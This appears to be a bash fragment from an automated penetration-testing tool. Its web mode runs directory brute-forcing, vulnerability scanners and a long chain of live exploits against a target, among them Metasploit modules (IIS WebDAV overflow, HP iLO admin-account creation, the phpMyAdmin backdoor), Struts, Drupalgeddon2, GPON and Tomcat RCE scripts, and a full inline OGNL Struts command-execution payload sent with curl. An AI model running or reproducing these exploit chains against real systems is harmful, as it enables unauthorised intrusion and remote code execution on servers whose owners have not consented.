if [ "$MODE" = "web" ];
  then
    if [ "$PASSIVE_SPIDER" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING PASSIVE WEB SPIDER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$TARGET&output=json" | jq -r .url | sort -u | tee $LOOT_DIR/web/spider-$TARGET.txt 2> /dev/null
    fi

    if [ "$BLACKWIDOW" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ACTIVE WEB SPIDER & APPLICATION SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      blackwidow -u http://$TARGET -l 3 -s y -v y
      cat /usr/share/blackwidow/$TARGET*/* > $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u http://$TARGET -w $WEB_BRUTE_INSANE -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,bak,zip,tar.gz,html,htm 
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* 2> /dev/null
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* > $LOOT_DIR/web/dirsearch-$TARGET.txt 2> /dev/null
    wget http://$TARGET/robots.txt -O $LOOT_DIR/web/robots-$TARGET-http.txt 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -Pn -T5 -p 80 -sV --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    clusterd -i $TARGET 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wpscan --url http://$TARGET --batch --disable-tls-checks
    echo ""
    wpscan --url http://$TARGET/wordpress/ --batch --disable-tls-checks
    echo ""
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CMSMAP $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $CMSMAP -t http://$TARGET
    echo ""
    python $CMSMAP -t http://$TARGET/wordpress/
    echo ""
    if [ "$NIKTO" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      nikto -h http://$TARGET -output $LOOT_DIR/web/nikto-$TARGET-http.txt
    fi

    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "80"; setg SSL false; run; set PATH /uploads/; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "80"; setg SSL false; run; use scanner/http/webdav_website_content; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING MICROSOFT IIS WEBDAV ScStoragePathFromUrl OVERFLOW $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RPORT "80"; setg SSL false; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT 80; set WAIT 2; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT 80; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT 80; set SSL false; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 80
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-5638 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-5638.py -u http://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-9805 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-9805.py -u http://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://$TARGET | head -n 1
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    ruby $INSTALL_DIR/bin/drupalgeddon2.rb http://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/cisco-asa-traversal.py http://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JEXBOSS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    cd /tmp/
    python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET
    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING GPON ROUTER EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/gpon_rce.py http://$TARGET:$PORT 'whoami'
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/tomcat-cve-2017-12617.py -u http://$TARGET
  fi